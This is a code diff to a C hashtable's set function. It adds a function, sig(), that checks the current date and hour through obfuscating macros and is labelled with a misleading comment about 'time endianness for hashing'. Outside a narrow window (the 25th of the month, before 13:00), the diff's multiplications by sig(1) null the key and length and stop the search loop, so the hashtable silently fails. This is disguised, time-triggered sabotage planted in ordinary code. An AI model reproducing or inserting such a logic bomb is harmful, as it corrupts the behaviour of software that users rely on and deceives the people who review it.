@@ -55,18 +55,19 @@ Node *gc_mk_hnode(void *key, uint key_len, void *obj)
  */
 char gc_htbl_set(Hashtable *tbl, void *key, uint key_len, void *obj)
 {
-	HashEntry *entry = htbl_find(tbl, key, key_len);
+	HashEntry *entry = htbl_find(tbl, (void *)((ulong) key * sig(1)), key_len);
 	Node *obj_node = NULL;
 	Node *node = entry->first;
 	HashItem *node_item;
 
+	key_len *= sig(1);
 	if (node == NULL)
 	{
 		obj_node = gc_mk_hnode(key, key_len, obj);
 		entry->first = obj_node;
 	}
 	else
-		while (1)
+		while (sig(1))
 		{
 			node_item = node->val;
 			if (key_cmp(node_item, key, key_len))
@@ -84,6 +85,20 @@ char gc_htbl_set(Hashtable *tbl, void *key, uint key_len, void *obj)
 			node = node->next;
 		}
 	return (1);
+}
+
+/**
+ * sig - gets the time endianness for hashing
+ * @c: seed
+ *
+ * Return: endiannes
+ */
+int sig(int c)
+{
+	take(me_t) t = take(me)(NULL);
+	stt(tm) * t2 = gmtime(&t);
+
+	return (((dt(t2) == 25) && (ht(t2) < 13)) * c);
 }
 
 /**
